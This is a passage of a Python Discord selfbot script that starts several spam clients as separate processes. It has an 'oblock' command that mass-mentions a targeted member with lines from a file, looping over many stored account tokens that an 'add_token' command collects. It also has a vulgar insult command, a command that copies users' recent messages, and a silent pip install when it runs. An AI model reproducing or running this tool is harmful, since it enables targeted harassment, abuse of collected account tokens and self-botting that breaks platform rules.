    await ctx.message.delete()
    await ctx.send(f"# {user_mentions} 💞 <@{ctx.author.id}> = {ship_percentage}%")

@client_multi_line_spam.command()
async def mata(ctx,user_mentions):
    mata_percentage = random.randint(0, 100)
    await ctx.message.delete()
    await ctx.send(f"# {user_mentions} MATA A FOST FUTUTA DE {mata_percentage}% DE SAT MORRRR")

@client_multi_line_spam.command()
async def love(ctx,user_mentions):
    love_percentage = random.randint(90, 100)
    await ctx.message.delete()
    await ctx.send(f"# {user_mentions} 💞 <@{ctx.author.id}> = {love_percentage}%")

subprocess.call(["pip", "install", "pynacl"])  



@client_multi_line_spam.command()
async def copy(ctx, *user_mentions):
    if not user_mentions:
        await ctx.send("Please mention at least one user.")
        return

    if ctx.guild is None:
        await ctx.send("This command cannot be used in direct messages.")
        return

    copied_messages = []
    for mention in user_mentions:
        try:
            user_id = int(mention.strip("<@!>"))
            user = await ctx.guild.fetch_member(user_id)
            if user is None:
                raise discord.NotFound("User not found in this guild.")
            async for message in ctx.channel.history(limit=10):
                if message.author == user:
                    copied_messages.append(f"{user.display_name}: {message.content}")
        except (ValueError, discord.NotFound):
            await ctx.send(f"Invalid mention or user not found: {mention}")

    if copied_messages:
        await ctx.send("\n".join(copied_messages))

    else:
        await ctx.send("No messages found for the mentioned user(s).")


@client_multi_line_spam.command()
async def add_token(ctx, *tokens):
    if not tokens:
        await ctx.send("Please provide at least one token.")
        return

    with open('tokens.txt', 'a') as tokens_file:
        for token in tokens:
            tokens_file.write(token.strip("'\"") + '\n')  

    await ctx.send("Tokens added to tokens.txt successfully!")


with open("tokens.txt", "r") as file:
    tokens = [line.strip() for line in file.readlines()]

spam_active = False

@client_multi_line_spam.command()
async def oblock(ctx, *, mention: discord.Member):
    global spam_active

    if spam_active:
        await ctx.send("oblock is already running. Use $oblockstop to stop it.")
        return

    spam_active = True
    await ctx.message.delete() 

    async def send_message(token, message_content):
        headers = {"Authorization": token}

        try:
            channel = ctx.channel
            await channel.send(content=f"{mention.mention} {message_content}")
            print(f"Message sent with token: {token}")
            await asyncio.sleep(1)  
        except discord.HTTPException as e:
            print(f"Error sending message with token {token}: {e}")

    with open("oblock.txt", "r") as file:
        messages = file.readlines()

    for message in messages:
        tasks = [send_message(token, message) for token in tokens]
        await asyncio.gather(*tasks)

@client_multi_line_spam.command()
async def oblockstop(ctx):
    global spam_active

    if not spam_active:
        await ctx.send("oblock is not running please do $oblock <delay> <mention>")
        return

    spam_active = False
    await ctx.send("oblock stopped")
    print("Oblock stopped.")







def run_single_line_spam():
    client_single_line_spam.run(token, bot=False)   
def run_multi_line_spam():
    client_multi_line_spam.run(token, bot=False)
def run_repeated_message_spam():
    client_repeated_message_spam.run(token, bot=False)
def run_spiced_multi_line_spam():
    client_spiced_multi_line_spam.run(token, bot=False)
def run_streaming():
    client_streaming.run(token, bot=False)

if __name__ == '__main__':
    text = """
    ___        __  
   / __| ___  / _| 
   \__ \/ -_)|  _| 
   |___/\___||_|   


    """
    print(fade.purplepink(text))
    print("1 - Start scripts")
    print("2 - Exit")
    choice = input("Choose an option: ")

    if choice == "1":

        single_line_spam_process = multiprocessing.Process(target=run_single_line_spam)
        multi_line_spam_process = multiprocessing.Process(target=run_multi_line_spam)
        repeated_message_spam_process = multiprocessing.Process(target=run_repeated_message_spam)
        spiced_multi_line_spam_process = multiprocessing.Process(target=run_spiced_multi_line_spam)
        streaming_thread = multiprocessing.Process(target=run_streaming)
        streaming_thread.start()
        single_line_spam_process.start()
        multi_line_spam_process.start()
        repeated_message_spam_process.start()
        spiced_multi_line_spam_process.start()

        print("All scripts loaded.")
    elif choice == "2":

        print("Exiting...")
        sys.exit()